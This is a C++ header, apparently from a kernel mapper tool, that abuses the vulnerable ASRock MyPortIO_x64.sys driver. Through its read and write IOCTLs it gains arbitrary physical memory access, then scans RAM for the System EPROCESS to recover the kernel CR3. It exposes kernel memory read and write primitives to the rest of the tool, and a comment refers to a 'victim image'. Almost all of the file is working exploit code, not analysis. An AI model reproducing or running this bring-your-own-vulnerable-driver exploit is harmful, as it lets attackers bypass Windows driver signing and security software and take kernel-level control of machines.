#pragma once
// primitive_myport.hpp — ASRock Polychrome MyPortIO_x64.sys (Wbhwdoctor)
// VM 26200: loads (not CI 1275). Device \\.\MyPortIODev
// IDA 0e7cd77a: MmMapIoSpace dword R/W, no chipset window.
//   0x9C406680 read  — in 12 bytes (phys u64, nbytes u32=4); result overwrites phys low dword
//   0x9C40A684 write — in 16 bytes (phys u64, nbytes u32=4, value u32)

#include "mapper.hpp"
#include <Windows.h>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <string>
#include <memory>
#include <algorithm>
#include <vector>
#include <unordered_set>

#ifdef min
#undef min
#endif

static constexpr DWORD MYPORT_IOCTL_READ = 0x9C406680;
static constexpr DWORD MYPORT_IOCTL_WRITE = 0x9C40A684;
static constexpr uint64_t MYPORT_PTE_ADDR_MASK = 0x000FFFFFFFFFF000ULL;
static constexpr uint64_t MYPORT_PDPTE_1GB_ADDR_MASK = 0x000FFFFFC0000000ULL;
static constexpr uint64_t MYPORT_PDE_2MB_ADDR_MASK = 0x000FFFFFFFE00000ULL;

static bool MyPortPaBacked(uint64_t pa, uint32_t bytes);
// Pages successfully read this process. After CR3 bootstrap, a new page is refused:
// IOCTL 0x9C406680 MmMapIoSpace's and derefs NULL (0x3B at MyPortIO+0x25a4).
static std::unordered_set<uint64_t> g_myportProvenPages;
static bool g_myportAllowNewPages = true;

static bool MyPortRead32(HANDLE h, uint64_t pa, uint32_t* out) {
    if (!MyPortPaBacked(pa, 4)) return false;
    if (pa > 0xFFFFFFFCu) return false;
    uint64_t page = pa >> 12;
    if (!g_myportAllowNewPages && !g_myportProvenPages.count(page)) return false;
    uint8_t pkt[16]{};
    *reinterpret_cast<uint64_t*>(pkt) = pa;
    *reinterpret_cast<uint32_t*>(pkt + 8) = 4;
    DWORD got = 0;
    if (!DeviceIoControl(h, MYPORT_IOCTL_READ, pkt, 12, pkt, 12, &got, nullptr))
        return false;
    *out = *reinterpret_cast<uint32_t*>(pkt);
    g_myportProvenPages.insert(page);
    return true;
}

static bool MyPortWrite32(HANDLE h, uint64_t pa, uint32_t value) {
    if (!MyPortPaBacked(pa, 4)) return false;
    if (!g_myportProvenPages.count(pa >> 12)) return false;
    uint8_t pkt[16]{};
    *reinterpret_cast<uint64_t*>(pkt) = pa;
    *reinterpret_cast<uint32_t*>(pkt + 8) = 4;
    *reinterpret_cast<uint32_t*>(pkt + 12) = value;
    DWORD got = 0;
    return DeviceIoControl(h, MYPORT_IOCTL_WRITE, pkt, 16, pkt, 16, &got, nullptr) != 0;
}

static bool MyPortPhysRead(HANDLE h, uint64_t pa, void* dst, size_t size) {
    auto* d = static_cast<uint8_t*>(dst);
    size_t off = 0;
    while (off < size) {
        uint32_t word = 0;
        uint64_t aligned = (pa + off) & ~3ull;
        uint32_t skip = (uint32_t)((pa + off) & 3);
        if (!MyPortRead32(h, aligned, &word)) return false;
        size_t n = std::min(size - off, (size_t)(4 - skip));
        memcpy(d + off, reinterpret_cast<uint8_t*>(&word) + skip, n);
        off += n;
    }
    return true;
}

static bool MyPortPhysWrite(HANDLE h, uint64_t pa, const void* src, size_t size) {
    const auto* s = static_cast<const uint8_t*>(src);
    size_t off = 0;
    while (off < size) {
        uint64_t aligned = (pa + off) & ~3ull;
        uint32_t skip = (uint32_t)((pa + off) & 3);
        uint32_t word = 0;
        if (skip || (size - off) < 4) {
            if (!MyPortRead32(h, aligned, &word)) return false;
        }
        size_t n = std::min(size - off, (size_t)(4 - skip));
        memcpy(reinterpret_cast<uint8_t*>(&word) + skip, s + off, n);
        if (!MyPortWrite32(h, aligned, word)) return false;
        off += n;
    }
    return true;
}

static uint64_t MyPortRead8(HANDLE h, uint64_t pa) {
    uint64_t v = 0;
    MyPortPhysRead(h, pa, &v, 8);
    return v;
}

static uint64_t MyPortVirtToPhys(HANDLE h, uint64_t cr3, uint64_t va) {
    auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };
    uint64_t pml4e = MyPortRead8(h, (cr3 & MYPORT_PTE_ADDR_MASK) + idx(39) * 8);
    if (!(pml4e & 1)) return 0;
    uint64_t pdpte = MyPortRead8(h, (pml4e & MYPORT_PTE_ADDR_MASK) + idx(30) * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & MYPORT_PDPTE_1GB_ADDR_MASK) | (va & 0x3FFFFFFF);
    uint64_t pde = MyPortRead8(h, (pdpte & MYPORT_PTE_ADDR_MASK) + idx(21) * 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & MYPORT_PDE_2MB_ADDR_MASK) | (va & 0x1FFFFF);
    uint64_t pte = MyPortRead8(h, (pde & MYPORT_PTE_ADDR_MASK) + idx(12) * 8);
    if (!(pte & 1)) return 0;
    return (pte & MYPORT_PTE_ADDR_MASK) | (va & 0xFFF);
}

struct MyPortRange { uint64_t lo, hi; };

static std::vector<MyPortRange> MyPortRanges() {
    std::vector<MyPortRange> ranges;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return ranges;
    DWORD dataSize = 0, type = 0;
    RegQueryValueExA(hKey, ".Translated", nullptr, &type, nullptr, &dataSize);
    auto data = std::make_unique<BYTE[]>(dataSize ? dataSize : 1);
    if (!dataSize || RegQueryValueExA(hKey, ".Translated", nullptr, &type, data.get(), &dataSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return ranges;
    }
    RegCloseKey(hKey);
    if (dataSize < 20) return ranges;
    auto* p = data.get();
    ULONG listCount = *(ULONG*)p; p += 4;
    for (ULONG i = 0; i < listCount && p < data.get() + dataSize; i++) {
        p += 12;
        ULONG descCount = *(ULONG*)p; p += 4;
        for (ULONG j = 0; j < descCount && p + 20 <= data.get() + dataSize; j++) {
            UCHAR resType = p[0];
            USHORT flags = *(USHORT*)(p + 2);
            uint64_t start = *(uint64_t*)(p + 4);
            uint64_t length = *(uint32_t*)(p + 12);
            p += 20;
            if (resType == 3 && length) ranges.push_back({ start, start + length });
            else if (resType == 7) {
                if (flags & 0x0200) length <<= 8;
                else if (flags & 0x0400) length <<= 16;
                else if (flags & 0x0800) length <<= 32;
                if (length) ranges.push_back({ start, start + length });
            }
        }
    }
    return ranges;
}

static bool MyPortInRange(uint64_t addr, const std::vector<MyPortRange>& ranges) {
    for (auto& r : ranges)
        if (addr >= r.lo && addr < r.hi) return true;
    return false;
}

// ISA hole plus the first extended page. MmMapIoSpace(0x100000) returns NULL and
// MyPortIO+0x25a4 bugchecks (DriverLab-E, 2026-11-14).
static bool MyPortPaForbidden(uint64_t pa) {
    return pa >= 0xA0000ull && pa < 0x200000ull;
}

static bool MyPortPaBacked(uint64_t pa, uint32_t bytes) {
    if (!bytes || pa > 0xFFFFFFFFull || bytes - 1 > 0xFFFFFFFFull - pa) return false;
    if (MyPortPaForbidden(pa) || MyPortPaForbidden(pa + bytes - 1)) return false;
    static const std::vector<MyPortRange> ranges = MyPortRanges();
    if (ranges.empty()) return false;
    return MyPortInRange(pa, ranges) && MyPortInRange(pa + bytes - 1, ranges);
}

static uint64_t MyPortVirtToPhysSafe(HANDLE h, uint64_t cr3, uint64_t va, const std::vector<MyPortRange>& ranges) {
    auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };
    uint64_t a0 = (cr3 & MYPORT_PTE_ADDR_MASK) + idx(39) * 8;
    if (!MyPortInRange(a0, ranges)) return 0;
    uint64_t pml4e = MyPortRead8(h, a0);
    if (!(pml4e & 1)) return 0;
    uint64_t a1 = (pml4e & MYPORT_PTE_ADDR_MASK) + idx(30) * 8;
    if (!MyPortInRange(a1, ranges)) return 0;
    uint64_t pdpte = MyPortRead8(h, a1);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & MYPORT_PDPTE_1GB_ADDR_MASK) | (va & 0x3FFFFFFF);
    uint64_t a2 = (pdpte & MYPORT_PTE_ADDR_MASK) + idx(21) * 8;
    if (!MyPortInRange(a2, ranges)) return 0;
    uint64_t pde = MyPortRead8(h, a2);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & MYPORT_PDE_2MB_ADDR_MASK) | (va & 0x1FFFFF);
    uint64_t a3 = (pde & MYPORT_PTE_ADDR_MASK) + idx(12) * 8;
    if (!MyPortInRange(a3, ranges)) return 0;
    uint64_t pte = MyPortRead8(h, a3);
    if (!(pte & 1)) return 0;
    return (pte & MYPORT_PTE_ADDR_MASK) | (va & 0xFFF);
}

static uint64_t MyPortBootstrapCR3(HANDLE h) {
    setvbuf(stdout, nullptr, _IONBF, 0);
    // Do not touch PA >= 4GB. MmMapIoSpace of 0x100000000 wedged the guest mapper
    // with no bugcheck. System EPROCESS on this VM is in the low range.
    printf("[*] MyPortBootstrapCR3 (low RAM only, < 512MB)\n");
    typedef NTSTATUS (NTAPI *pNtQSI)(ULONG, PVOID, ULONG, PULONG);
    auto NtQSI = (pNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return 0;
    ULONG needed = 0;
    NtQSI(11, nullptr, 0, &needed);
    auto buf = std::make_unique<uint8_t[]>(needed);
    if (NtQSI(11, buf.get(), needed, &needed) != 0) return 0;
    struct MOD {
        PVOID Section; PVOID MappedBase; PVOID ImageBase;
        ULONG ImageSize; ULONG Flags;
        USHORT LoadOrderIndex; USHORT InitOrderIndex;
        USHORT LoadCount; USHORT OffsetToFileName;
        CHAR FullPathName[256];
    };
    if (!*(ULONG*)buf.get()) return 0;
    auto* mod0 = (MOD*)(buf.get() + 8);
    uint64_t ntVA = (uint64_t)mod0->ImageBase;
    printf("[*] ntoskrnl VA=0x%llx\n", (unsigned long long)ntVA);
    auto ranges = MyPortRanges();
    if (ranges.empty()) return 0;
    for (const auto& r : ranges)
        printf("[*] RAM 0x%llx-0x%llx\n", (unsigned long long)r.lo, (unsigned long long)r.hi);
    auto validate = [&](uint64_t c) -> bool {
        uint64_t pa = MyPortVirtToPhysSafe(h, c, ntVA, ranges);
        if (!pa) return false;
        uint16_t mz = 0;
        MyPortPhysRead(h, pa, &mz, 2);
        return mz == 0x5A4D;
    };
    uint64_t cr3 = 0;
    const uint64_t kScanHi = 0x20000000ULL; // 512MB
    struct Off { uint32_t name, pid, dtb, flink; };
    const Off offs[] = {
        { 0x338, 0x1D0, 0x028, 0x1D8 },
        { 0x5A8, 0x440, 0x028, 0x448 },
    };
    printf("[*] MyPort EPROCESS scan inside RAM ranges, below 0x%llx\n",
           (unsigned long long)kScanHi);
    for (const auto& range : ranges) {
        if (cr3) break;
        uint64_t lo = range.lo > 0x200000ull ? range.lo : 0x200000ull;
        uint64_t hi = range.hi < kScanHi ? range.hi : kScanHi;
        lo = (lo + 0xFFF) & ~0xFFFULL;
        hi &= ~0xFFFULL;
        for (uint64_t pa = lo; pa + 0x1000 <= hi && !cr3; pa += 0x1000) {
        if ((pa & 0xFFFF) == 0)
            printf("[*]   MyPort scan: 0x%llx\n", (unsigned long long)pa);
        for (const auto& o : offs) {
            uint32_t head = 0;
            if (!MyPortRead32(h, pa + o.name, &head)) continue;
            if (head != 0x74737953) continue; // "Syst"
            uint32_t tail = 0;
            if (!MyPortRead32(h, pa + o.name + 4, &tail)) continue;
            if ((tail & 0xFFFF) != 0x6D65) continue; // "em"
            uint32_t pid = 0;
            if (!MyPortRead32(h, pa + o.pid, &pid) || pid != 4) continue;
            uint64_t flink = MyPortRead8(h, pa + o.flink);
            if ((flink >> 48) != 0xFFFF) continue;
            uint64_t dtb = MyPortRead8(h, pa + o.dtb) & ~0xFFFULL;
            if (!dtb || dtb >= 0x100000000ULL) continue;
            printf("[*] candidate EPROCESS pa=0x%llx dtb=0x%llx\n",
                   (unsigned long long)pa, (unsigned long long)dtb);
            if (validate(dtb)) {
                cr3 = dtb;
                break;
            }
        }
        }
    }
    printf("[+] MyPort CR3=0x%llx proven_pages=%zu\n",
           (unsigned long long)cr3, g_myportProvenPages.size());
    // Pages outside 0xA0000-0x200000 stay readable. Locking to proven pages
    // blocked the victim image, which is not in the EPROCESS scan window.
    return cr3;
}

static bool MyPortVirtRead(HANDLE h, uint64_t cr3, uint64_t va, void* dst, size_t n) {
    auto* d = static_cast<uint8_t*>(dst);
    while (n) {
        uint64_t pa = MyPortVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t chunk = std::min(n, (size_t)(0x1000 - (pa & 0xFFF)));
        if (!MyPortPhysRead(h, pa, d, chunk)) return false;
        d += chunk; va += chunk; n -= chunk;
    }
    return true;
}

static bool MyPortVirtWrite(HANDLE h, uint64_t cr3, uint64_t va, const void* src, size_t n) {
    const auto* s = static_cast<const uint8_t*>(src);
    while (n) {
        uint64_t pa = MyPortVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t chunk = std::min(n, (size_t)(0x1000 - (pa & 0xFFF)));
        if (!MyPortPhysWrite(h, pa, s, chunk)) return false;
        s += chunk; va += chunk; n -= chunk;
    }
    return true;
}

struct MyPortSession {
    HANDLE dev = INVALID_HANDLE_VALUE;
    uint64_t cr3 = 0;
};

inline KernelPrimitives OpenMyPort(std::string& err)
{
    printf("[*] OpenMyPort\n");
    HANDLE h = CreateFileW(L"\\\\.\\MyPortIODev", GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE) {
        err = "OpenMyPort: CreateFile failed err=" + std::to_string(GetLastError());
        return {};
    }
    uint32_t smoke = 0;
    if (!MyPortRead32(h, 0x1100, &smoke)) {
        CloseHandle(h);
        err = "OpenMyPort: smoke read failed";
        return {};
    }
    printf("[+] MyPort smoke pa=0x1100 val=0x%08x\n", smoke);
    uint64_t cr3 = MyPortBootstrapCR3(h);
    if (!cr3) {
        CloseHandle(h);
        err = "OpenMyPort: CR3 bootstrap failed";
        return {};
    }
    auto sp = std::make_shared<MyPortSession>();
    sp->dev = h;
    sp->cr3 = cr3;
    KernelPrimitives p;
    p.ReadKernelMemory = [sp](void* dst, uint64_t src, size_t sz) {
        return MyPortVirtRead(sp->dev, sp->cr3, src, dst, sz);
    };
    p.WriteKernelMemory = [sp](uint64_t dst, const void* src, size_t sz) {
        return MyPortVirtWrite(sp->dev, sp->cr3, dst, src, sz);
    };
    p.AllocateKernelMemory = nullptr;
    p.ReadPhysicalMemory = [sp](void* dst, uint64_t pa, size_t sz) {
        return MyPortPhysRead(sp->dev, pa, dst, sz);
    };
    p.cr3 = cr3;
    p.UpdateCR3 = [sp](uint64_t c) { sp->cr3 = c; };
    return p;
}
